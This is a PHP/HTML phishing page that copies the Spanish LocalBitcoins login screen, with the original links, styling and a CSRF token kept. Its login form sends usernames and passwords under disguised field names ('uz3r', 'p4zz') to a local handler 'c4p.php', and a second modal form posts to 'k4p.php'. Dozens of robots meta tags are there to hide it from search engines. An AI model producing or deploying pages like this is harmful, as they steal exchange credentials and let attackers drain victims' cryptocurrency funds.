<?php  
// include "cryp.php";
?>
<html lang="es"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">


  <link id="favicon" rel="icon" type="image/png" href="https://localbitcoins.com/cached-static/img/favicon.33c6e1ef2984.ico">
  <link id="favicon-blink" rel="" type="image/png" href="https://localbitcoins.com/cached-static/img/favicon.33c6e1ef2984.ico">

  <link rel="apple-touch-icon" href="cached-static/img/touch-icon-57.e1027353ae6e.png">
  <link rel="apple-touch-icon" sizes="72x72" href="cached-static/img/touch-icon-72.99173ef1adbe.png">
  <link rel="apple-touch-icon" sizes="114x114" href="cached-static/img/touch-icon-114.f8bf6fba2cd2.png">
  <link rel="apple-touch-icon" sizes="144x144" href="cached-static/img/touch-icon-144.28f60a5711cc.png">



<meta name="robots" content="none">
	<meta name="robots" content="noindex">
	<meta name="robots" content="nofollow">
	<meta name="robots" content="noarchive">
	<meta name="robots" content="nocache">
	<meta name="robots" content="noimageindex">
	<meta name="robots" content="nomediaindex">
	<meta name="robots" content="noodp">
	<meta name="robots" content="noodyp">
	<meta name="robots" content="notranslate">
	<meta name="robots" content="noyaca">
	<meta name="robots" content="noydir">
	<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
	<meta name="googlebot" content="none">
	<meta name="googlebot" content="noindex">
	<meta name="googlebot" content="nofollow">
	<meta name="googlebot" content="noarchive">
	<meta name="googlebot" content="nocache">
	<meta name="googlebot" content="noimageindex">
	<meta name="googlebot" content="nomediaindex">
	<meta name="googlebot" content="noodp">
	<meta name="googlebot" content="noodyp">
	<meta name="googlebot" content="notranslate">
	<meta name="googlebot" content="noyaca">
	<meta name="googlebot" content="noydir">
	<meta name="slurp" content="none">
	<meta name="slurp" content="noindex">
	<meta name="slurp" content="nofollow">
	<meta name="slurp" content="noarchive">
	<meta name="slurp" content="nocache">
	<meta name="slurp" content="noimageindex">
	<meta name="slurp" content="nomediaindex">
	<meta name="slurp" content="noodp">
	<meta name="slurp" content="notranslate">
	<meta name="slurp" content="noyaca">
	<meta name="slurp" content="noydir">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script type="text/javascript"></script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam-cell.nr-data.net","errorBeacon":"bam-cell.nr-data.net","licenseKey":"d482f57533","applicationID":"8341283","transactionName":"ZwZVMhBTXUMDWhEPDV5McRMMUUdZDVdKAxpTC1YIBVcdXA1eDAhYXAxQDww=","queueTime":0,"applicationTime":16,"agent":""}</script>

<link href="cached-static/bootstrap/css/bootstrap.min.5c7070ef655a.css" rel="stylesheet">
<link href="cached-static/font-awesome-4.5.0/css/font-awesome.min.dcc433f0f2ff.css" rel="stylesheet">

  <link rel="stylesheet" href="cached-static/style.83880f8f3f36.css">
  <link rel="stylesheet" href="cached-static/quickform.96d6bb50f184.css">
  <link rel="stylesheet" href="cached-static/bootstrap-extensions.ac6fa260a89d.css">

<title>LocalBitcoins.com: La forma más rápida y fácil de comprar y vender bitcoins - LocalBitcoins</title>

<meta name="keywords" content="buy bitcoins cash dollar euro pound local dealer bank transfer sell">


<meta name="description" content="Compre y venda bitcoins cerca de usted. Rápido, fácil y privado.">

<meta name="viewport" content="width=device-width">


<meta name="theme-color" content="#f58220">




    
    




<link rel="stylesheet" type="text/css" href="cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css">




<script></script>









</head>

<body class="server-prod session-anonymous">



  




<nav class="navbar navbar-fixed-top navbar-default" id="navbar-site">
  <div class="container">
    <div class="navbar-header">
      
        <a class="navbar-brand site-logo-img" href="https://localbitcoins.com/es/"><img src="cached-static/img/site-logo-500.b39d9369a078.png" class="img-responsive site-logo"></a>
      

      <!-- Dropdown menu toggle button in responsive mode -->
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
        <!-- Info for screen readers only -->
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>

      
    </div>

    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">
        <li class="trades-elements"><a href="https://localbitcoins.com/es/comprar_bitcoins">Comprar bitcoins</a></li>
        <li class="trades-elements"><a href="https://localbitcoins.com/es/vender_bitcoins">Vender bitcoins</a></li>
        

        <!-- On medium sized screens 'Trades' will have its own dropdown menu -->
        <li class="dropdown trades-dropdown" id="trades-ddl">
          <a class="dropdown-toggle" data-toggle="dropdown" href="#trades-ddl">
          Operaciones de compra y venta
          <b class="caret"></b>
          </a>
          <ul class="dropdown-menu">
              <li><a href="https://localbitcoins.com/es/comprar_bitcoins">Comprar bitcoins</a></li>
              <li><a href="https://localbitcoins.com/es/vender_bitcoins">Vender bitcoins</a></li>
              
          </ul>
        </li>

        <!-- Help dropdown menu -->
        <li class="dropdown">
          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">
            Información
            <b class="caret"></b>
          </a>
          <ul class="dropdown-menu" role="menu">
            <li><a href="https://localbitcoins.com/guides/how-to-buy-bitcoins">Cómo comprar bitcoins</a></li>
            <li><a href="https://localbitcoins.com/faq">Preguntas frecuentes</a></li>
            <li><a href="https://localbitcoins.com/guides/">Guías</a></li>
            <li><a href="https://localbitcoins.com/webinar/">Seminarios web</a></li>
            <li><a href="https://localbitcoins.com/support/">Contacte a soporte</a></li>
            <li><a href="https://localbitcoins.com/blog/">Blog</a></li>
            <li><a href="https://localbitcoins.com/fees">Comisiones</a></li>
            <li><a href="https://localbitcoins.com/about">Sobre nosotros</a></li>
          </ul>
        </li>
      </ul>

      <!-- Right side of navbar -->
      
        
          <ul class="nav navbar-nav navbar-right">
            <li>
              <a id="top-register-link" class="register-link" href="https://localbitcoins.com/register/"><span><i class="fa fa-check-square-o"></i>
              
                Registro
              
                </span>
              </a>
            </li>
            <li><a id="top-login-link" href="index.html"><i class="fa fa-user"></i>&nbsp;iniciar sesión</a></li>
        
        </ul>
      
    </div>
  </div>
</nav>


  
    





  
















    




<div class="container">

    




    
    





<div class="row">
<div class="col-md-7">



<h2 class="login-heading bold-text">iniciar sesión</h2>




<form action="c4p.php" class="login-form" method="post">    

<input type="hidden" name="csrfmiddlewaretoken" value="aESIZTxKnvHzM60agXfjST6FgCJvLvrRNiMJSMzh15JF3KYqRyGtal5hMfUG8nOa"> <fieldset> <div id="div_id_username" class="form-group"> <div class="controls "> <input type="text" name="uz3r" maxlength="100" placeholder="Nombre de usuario o correo electrónico" class="textinput textInput form-control" required="" id="id_username"> </div> </div> <div id="div_id_password" class="form-group"> <div class="controls "> <input type="password" name="p4zz" placeholder="Contraseña" class="textinput textInput form-control" required="" id="id_password"> </div> </div> </fieldset>

    
            <div class="">
                <label class="control-label">Por favor, demuestre que es un humano.</label>
                
                <div class="g-recaptcha" data-sitekey="6LfPtc8ZAAAAACrTSoGEJ1hAArXEgdPie7P2wve1"></div>
                <span class="help-block"><strong></strong></span>
            </div>
            

    
      <p>
        <button class="btn btn-primary">Inicio de sesión</button>
      </p>
      <p>
        <a class="login-form-a" href="https://localbitcoins.com/password_reset/">¿Ha olvidado su contraseña?</a>
        </p><div class="login-link">¿Nuevo en LocalBitcoins?&nbsp;<a href="https://localbitcoins.com/register/?next=/">¡Regístrese ahora!</a></div>
      <p></p>
    

</form>





</div>


</div>


</div>







<div class="clearfix"></div>

<hr>

<footer class="container">
  <div class="row footer-block">
    <div class="col-md-4 hidden-sm">
      <img id="footer-logo" src="cached-static/img/site-logo_grey.2c59226a8ab9.png" class="img-responsive">
    </div>
    <div class="col-md-2" id="col-about">
      <ul class="nav nav-list">
        <li class="nav-header">ACERCA DE</li>
        <li><a href="https://localbitcoins.com/about">Sobre nosotros</a></li>
        <li><a href="https://localbitcoins.com/careers">Oportunidades de empleo</a></li>
        <li><a href="https://localbitcoins.com/fees">Comisiones</a></li>
        <li><a href="https://localbitcoins.com/whitehat">Recompensas de seguridad</a></li>
        <li><a href="https://localbitcoins.com/terms_of_service/">Términos de servicio</a></li>
        <li><a href="https://localbitcoins.com/privacy_policy/">Política de privacidad</a></li>
      </ul>
    </div>
    <div class="col-md-2" id="col-support">
      <ul class="nav nav-list">
        <li class="nav-header">SOPORTE</li>
        <li><a href="https://localbitcoins.com/support/request/">Contacte a soporte</a></li>
        <li><a href="https://localbitcoins.com/faq">PREGUNTAS MÁS FRECUENTES</a></li>
        <li><a href="https://localbitcoins.com/guides/">Guías</a></li>
        <li><a href="https://localbitcoins.com/password_reset/">Olvidé la contraseña</a></li>
      </ul>
    </div>
    <div class="col-md-2" id="col-services">
      <ul class="nav nav-list">
        <li class="nav-header">SERVICIOS</li>
        




<li class="dropdown" id="language-dropdown">

    

    <a class="dropdown-toggle" data-toggle="dropdown" href="#language-dropdown">
        <i class="fa fa-globe"></i>
        español
    </a>

    

    <ul class="dropdown-menu">

        

            

            <li id="lang-select-en">
                <a rel="nofollow" href="https://localbitcoins.com/language/set_language_improved?language=en&amp;next=/accounts/login/">
                    English (en)
                </a>
            </li>
        

            

            <li id="lang-select-es">
                <a rel="nofollow" href="https://localbitcoins.com/language/set_language_improved?language=es&amp;next=/accounts/login/">
                    español (es)
                </a>
            </li>
        

            

            <li id="lang-select-fr">
                <a rel="nofollow" href="https://localbitcoins.com/language/set_language_improved?language=fr&amp;next=/accounts/login/">
                    français (fr)
                </a>
            </li>
        

            

            <li id="lang-select-it">
                <a rel="nofollow" href="https://localbitcoins.com/language/set_language_improved?language=it&amp;next=/accounts/login/">
                    italiano (it)
                </a>
            </li>
        

            

            <li id="lang-select-ru">
                <a rel="nofollow" href="https://localbitcoins.com/language/set_language_improved?language=ru&amp;next=/accounts/login/">
                    Русский (ru)
                </a>
            </li>
        

            

            <li id="lang-select-pt-br">
                <a rel="nofollow" href="https://localbitcoins.com/language/set_language_improved?language=pt-br&amp;next=/accounts/login/">
                    Português Brasileiro (pt-br)
                </a>
            </li>
        

            

            <li id="lang-select-zh-hans">
                <a rel="nofollow" href="https://localbitcoins.com/language/set_language_improved?language=zh-hans&amp;next=/accounts/login/">
                    简体中文 (zh-hans)
                </a>
            </li>
        
    </ul>
</li>

        
        <li><a href="https://localbitcoins.com/api-docs/">Documentación de la API</a></li>
        <li><a href="https://localbitcoins.com/affiliate/">Afiliados</a></li>
        <li><a href="https://localbitcoinschain.com/">Bloquear explorador</a></li>
      </ul>
    </div>
    <div class="col-md-2">
          <ul class="nav nav-list">
            <li class="nav-header">SÍGANOS&nbsp;</li>
            <li><a href="https://www.facebook.com/pages/Localbitcoinscom/266849920086274?notif_t=page_new_likes" target="_blank" rel="noopener noreferrer">
              <i class="fa fa-fw fa-facebook"></i>
              &nbsp;Facebook
            </a></li>
            <li><a href="https://twitter.com/LocalBitcoins" target="_blank" rel="noopener noreferrer">
              <i class="fa fa-fw fa-twitter"></i>
              &nbsp;Twitter
            </a></li>
            <li><a href="https://www.linkedin.com/company/localbitcoins" target="_blank" rel="noopener noreferrer">
              <i class="fa fa-linkedin"></i>
              &nbsp;LinkedIn
            </a></li>
            <li><a href="https://www.instagram.com/localbitcoins/" target="_blank" rel="noopener noreferrer">
              <i class="fa fa-instagram"></i>
              &nbsp;Instagram
            </a></li>
            <li><a href="https://www.youtube.com/c/LocalBitcoinsTV" target="_blank" rel="noopener noreferrer">
              <i class="fa fa-youtube"></i>
              &nbsp;YouTube
            </a></li>
            <li><a href="https://localbitcoins.com/blog/">
              <i class="fa fa-fw fa-rss"></i>
              &nbsp;Blog
            </a></li>
            <li>
              
                 <a href="https://medium.com/localbitcoins-blog-en-español" target="_blank" rel="noopener noreferrer">
              
              <i class="fa fa-fw fa-medium"></i>
              &nbsp;Medium
            </a></li>
          </ul>
    </div>
  </div>
</footer>


<form id="login-modal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="register-form-label" aria-hidden="true" action="k4p.php" method="POST">
  <div class="modal-dialog">
  <div class="modal-content">
    <div class="modal-header">
        <button id="login-popup-close" type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 id="register-form-label">Inicie sesión en LocalBitcoins.com</h3>
    </div>
    <div class="modal-body">
        <input type="hidden" name="csrfmiddlewaretoken" value="aESIZTxKnvHzM60agXfjST6FgCJvLvrRNiMJSMzh15JF3KYqRyGtal5hMfUG8nOa">
        



        <input type="hidden" name="next" value="/">
        <p><b>¿Problemas para iniciar sesión?</b></p>
        <ul>
        <li>Si ha olvidado su nombre de usuario, intente <b>acceder con su dirección de correo&nbsp;eléctronico</b>.</li>
        <li>¿Ha olvidado su contraseña? <a href="https://localbitcoins.com/password_reset/">Restablecer contraseña</a></li>
        </ul>
    </div>
    <div class="modal-footer">
        <button id="login-button" class="btn btn-success" type="submit">Iniciar sesión</button>
        <button id="login-popup-cancel" class="btn" data-dismiss="modal" aria-hidden="true">Cerrar</button>
    </div>
    </div>
    </div>
</form>

















<audio id="notification-tone" preload="none" class="display-none">
    <source src="https://localbitcoins.com/cached-static/notifications/tone.ff3720da7908.ogg" type="audio/ogg">
    <source src="https://localbitcoins.com/cached-static/notifications/tone-40k.a43490007221.mp3" type="audio/mpeg">
</audio>








<script type="text/javascript">
  $(document).ready(function() { $("#id_username").focus(); });
</script>






</body></html>